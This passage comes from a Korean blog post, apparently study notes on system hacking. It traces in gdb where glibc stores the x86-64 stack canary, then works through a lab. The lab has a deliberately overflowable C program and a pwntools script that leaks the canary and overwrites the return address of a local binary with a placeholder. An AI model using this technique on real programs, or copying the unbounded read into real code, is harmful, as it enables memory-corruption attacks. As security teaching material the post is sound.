&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS_INIT_TP&lt;/code&gt; 가 실행되면  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ARCH_SET_FS&lt;/code&gt; 가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 에 들어가 있을 것이다. 그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ARCH_SET_FS&lt;/code&gt; 는 어떤 값을 가지고 있을까?&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//prctl.h&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#ifndef _ASM_X86_PRCTL_H
#define _ASM_X86_PRCTL_H
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define ARCH_SET_GS 0x1001
#define ARCH_SET_FS 0x1002
#define ARCH_GET_FS 0x1003
#define ARCH_GET_GS 0x1004
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* _ASM_X86_PRCTL_H */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS_INIT_TP&lt;/code&gt; 가 명시된 소스 코드에 include된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys/prctl.h&lt;/code&gt; 의 소스를 보니, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1002&lt;/code&gt;인 것으로 확인되었다.&lt;/p&gt;

&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS_INIT_TP&lt;/code&gt; 가 실행되면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1002&lt;/code&gt; 가 저장되고, 목표했던 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt;(__NR_arch_prctl; 여기에서 NR은 달라지는 아키텍처에 따라 시스콜이 추가되면서 호환성을 위해 각 아키텍처별로 다르게 호명할 수 있도록 호환성을 보장하기 위한 태그다. 자세한 건 &lt;a href=&quot;https://man7.org/linux/man-pages/man2/syscall.2.html&quot;&gt;여기&lt;/a&gt;에서)이 수행되며 FS에 TLS 구조체의 시작값이 할당될 것이다.&lt;/p&gt;

&lt;p&gt;정말로 그런지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS_INIT_TP&lt;/code&gt; 가 콜되기 직전에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1002&lt;/code&gt; 가 들어간 게 보인다. 콜되기 전에 미리 파라미터가 레지스터에 들어간 것으로 미루어 보았을 때 아마도 컴파일러의 최적화 때문에 순서가 당겨진 것 같다.&lt;/p&gt;

&lt;p&gt;그리고 같은 이유로 인해 이미 시스콜이 수행되며 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r12&lt;/code&gt;에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS&lt;/code&gt; 의 시작값이 들어간 것이 확인되었다&lt;sup id=&quot;fnref:r12&quot;&gt;&lt;a href=&quot;#fn:r12&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;. 실제로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs&lt;/code&gt; 에 할당된 값이 맞는지 명령어를 통해 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2013.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;맞는 것으로 확인되었다.&lt;/p&gt;

&lt;p&gt;앞에 $가 붙은 것은 gdb상에서 심볼로 취급되므로 명령어 인라인에 사용할 수 있다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base&lt;/code&gt; 가 가리키는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS&lt;/code&gt; 에 무엇이 저장되었는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2014.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base+0x28&lt;/code&gt;, 즉 스택 카나리가 저장되는 위치에 스택 카나리가 저장되어 있는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2015.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아직은 아무것도 저장되어 있지 않은 것을 확인할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-스택-카나리의-저장-과정-추적&quot;&gt;2.2. 스택 카나리의 저장 과정 추적&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base+0x28&lt;/code&gt; 위치의 값이 변경될 때가 바로 스택 카나리가 저장될 때일 것이다. 따라서 gdb의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;watch&lt;/code&gt; 명령어로 해당 위치의 값이 변경될 때 코드 플로우를 멈추도록 해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2016.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; 심볼은 참조한다는 뜻이다. 즉, 해당 주소를 참조해 내부의 값을 감시한다는 뜻이 되기 때문에 특정 주소의 값 변화를 감시하기 위해서는 반드시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; 심볼을 사용해야 한다.&lt;/p&gt;

&lt;p&gt;프로세스를  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; 명령어로 이어서 수행한 결과, 아래와 같은 결과가 나왔다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2017.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;값이 변화되자 코드 플로우가 멈추고 값이 어떻게 변화했는지가 출력된다. 정지하는 시점에서 실행되던 함수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security_init&lt;/code&gt; 라고 명시되어 있다. 이제 실제로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base+0x28&lt;/code&gt; 위치의 값이 어떻게 되었는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2018.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2019.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;스택 카나리 값이 저장된 것이 확인되었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;23-main에서-사용되는-스택-카나리-확인&quot;&gt;2.3. main에서 사용되는 스택 카나리 확인&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 실제로 해당 값이 main 함수에서 사용되는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2020.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rax, qword prt fs:[0x28]&lt;/code&gt; 명령어가 실행된 직후의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; 를 확인해 보니, 정말로 직전에 확인했던 스택 카나리 값이 저장된 것을 볼 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-카나리-우회&quot;&gt;3. 카나리 우회&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;카나리를 포함한 각종 메모리 보호 기법 우회 관련해서는 이미 &lt;a href=&quot;https://toubva.github.io/blog/system_hacking/memory-exploit-mitigation-bypass-01/#/&quot;&gt;이전 포스트&lt;/a&gt;에서 다룬 바가 있지만, 한 번 더 정리하려 한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;31-brute-force&quot;&gt;3.1. Brute Force&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 기법을 이용해 카나리를 맞춘다는 것은 불가능에 가깝다.&lt;/p&gt;

&lt;p&gt;카나리 값으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x64&lt;/code&gt;에서는 8byte, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x86&lt;/code&gt;에서는 4byte 길이의 pseudo-random 값이 생성되며, 가장 끝 1byte가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/x00&lt;/code&gt; 인 것을 감안하더라도 각각 7byte, 4byte의 자릿수를 맞춰야 하기 때문이다.&lt;/p&gt;

&lt;p&gt;실제 서버를 대상으로 이 기법을 수행하면 성공하기 한참 전에 경찰에 체포될 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;32-tls-접근-canary-leak&quot;&gt;3.2. TLS 접근-Canary Leak&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;TLS의 주소는 매번 시행할 때마다 바뀌지만, 만일 실행중에 TLS의 주소를 알 수 있고 이에 쓰기나 읽기가 가능하다면 읽어온 카나리 값을 이용하거나, 카나리 값 자체를 변조할 수 있을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;4-카나리-우회-실습&quot;&gt;4. 카나리 우회 실습&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;41-코드-분석&quot;&gt;4.1. 코드 분석&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아래 코드를 컴파일한 프로그램에서 Stack Smashed 감지 없이 오버플로우를 수행해 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Name: bypass_canary.c&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Compile: gcc -o bypass_canary bypass_canary.c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;memo : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;memo %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;가장 먼저 이름을 입력하는 란에 8글자를 입력해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; 함수가 64글자까지를 받기 때문에, 원래는 7글자까지만 사용자 입력을 받은 다음 뒤에 NULL byte가 붙을 것을 상정하고 선언된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; 배열은 충분히 오버플로우될 수 있다.&lt;/p&gt;

&lt;p&gt;즉, 스택 카나리의 최하위 1byte가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x00&lt;/code&gt;, 즉 NULL byte로 설정되는 특성과 리틀 엔디안으로 가장 작은 자릿수가 가장 먼저 인식된다는 점을 감안했을 때, Canary Leak을 원하는 사용자는 총 9byte의 입력을 주어 스택 카나리의 최하위에 존재하는 NULL byte를 없애야만 한다.&lt;/p&gt;

&lt;p&gt;이를 그림으로 본다면 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2021.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위와 같았던 메모리를&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2022.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; 변수에 9byte를 넣음으로써 스택 카나리의 최하위 비트인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x00&lt;/code&gt; 이 지워지게 만들었다.&lt;/p&gt;

&lt;p&gt;이후 name 변수를 출력하기 위해  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 함수를 사용하는데, 해당 함수는 null byte를 문자열의 끝으로 보고 메모리 읽기를 멈추는 특성이 있기 때문에 스택 카나리까지를 고스란히 출력하게 된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;42-익스플로잇-구성&quot;&gt;4.2. 익스플로잇 구성&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 익스플로잇을 짜 보자.&lt;/p&gt;

&lt;p&gt;익스플로잇에 구현되어야 할 기능은 다음과 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;총 9 byte의 입력값을 준다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendline()&lt;/code&gt; 함수를 사용한다면 끝에 개행 문자가 자동으로 붙는 것을 감안하여 해당 함수의 인자로 8 byte를 주는 식이다.&lt;/li&gt;
  &lt;li&gt;이후 출력되는 값을 받아오고, 그중 하위 7byte만 저장한다. (문자열 출력 방식에 따라 리틀 엔디안 방식으로 표현된 스택 카나리가 나올 것이다)&lt;/li&gt;
  &lt;li&gt;저장한 값의 최상위 1byte에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x00&lt;/code&gt; 을 저장한다.&lt;/li&gt;
  &lt;li&gt;이후 memo 변수에 대한 입력으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x10&lt;/code&gt; byte의 dump와 스택 카나리 값(리틀 엔디안), 8 byte의 dump, 그리고 RET로 주고 싶은 값을 준다.
    &lt;ul&gt;
      &lt;li&gt;ASLR이 켜져 있고 NX-bit가 활성화되어 있으며 Full-RELRO이기 때문에 이 경우 가능한 익스 방법은 GOT의 base 주소를 leak해서 system 함수의 PLT를 알아낸 다음 RET에 넣어주는 것이다. PLT의 주소를 덮어쓰는 게 불가능하니까…&lt;/li&gt;
      &lt;li&gt;근데 그걸… 지금은 못할 듯? 일단 입력값을 최장 64 byte 만 받고 있기 때문에 현재 libc의 base가 leak되지 않았고 system 함수가 사용되지 않아 plt 심볼을 찾을 수 없는 점을 감안하면 더 돌아 돌아 가야 할 텐데, 그걸 64 byte 이내로 구현 못 하겠다.&lt;/li&gt;
      &lt;li&gt;어떻게 할 지 방법이 안 서는 것도 있고!&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;따라서 익스플로잇의 목적은 리턴 주소를 원하는 값으로 변조하더라도 스택 카나리 변조가 인식되지 않게끔 하는 것으로 결정되었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;43-익스플로잇-실행&quot;&gt;4.3. 익스플로잇 실행&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 작성한 익스플로잇은 아래와 같았다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./bypass_canary&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 1. 9 byte input
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;AAAAAAAA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 2. get 7 bytes(least significant) from output and insert Null byte in front of it
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello AAAAAAAA&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 3. give the payload which I want
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rbp_dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xDEADBEEFCAFECAFE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp_dump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret_addr&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 익스플로잇을 실행한 결과는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2023.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 함수의 가장 마지막 부분에서 스택 카나리 원본과 스택에 저장된 스택 카나리 값을 비교하고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+183&lt;/code&gt; 에서 만일 값이 같다면 정상적으로 프로세스를 종료하고 만일 아니라면 오류를 내보내도록 되어 있다. 따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+183&lt;/code&gt; 에 브레이크 포인트를 걸고 continue해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2024.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

